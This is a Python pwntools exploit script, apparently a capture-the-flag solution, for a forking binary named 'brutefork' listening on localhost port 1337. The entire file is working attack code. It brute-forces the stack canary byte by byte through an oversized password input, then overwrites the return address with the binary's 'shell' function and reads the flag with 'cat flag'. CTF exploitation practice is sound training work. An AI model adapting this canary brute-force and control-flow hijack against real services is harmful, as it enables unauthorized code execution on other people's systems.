#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.binary = 'brutefork'


def exploit():
    bytes = [chr(n) for n in range(256)]

    p = log.progress("Leaking canary")
    canary = '\0'

    while len(canary) < 4:
        for b in bytes:
            guess = canary + b

            p.status("%s", ' '.join(enhex(c) for c in guess))
            if try_canary(guess):
                canary = guess
                break
        else:
            log.error("Failed to leak canary")

    p.success("%s", ' '.join(enhex(c) for c in canary))

    r = connection(canary + 'B'*12 + p32(context.binary.symbols.shell))
    sleep(1)
    r.sendline('cat flag')
    log.success("Flag: %s", r.recvline_contains('CSR').strip())


def try_canary(guess):
    with context.local(log_level='ERROR'):
        r = connection(guess)
        ret = r.recvall()
        r.close()
        return ret.strip().endswith('failed!')


def connection(canary):
    r = remote('localhost', 1337)
    r.sendafter('password: ', 'A' * 100 + canary)
    return r


if __name__ == "__main__":
    exploit()
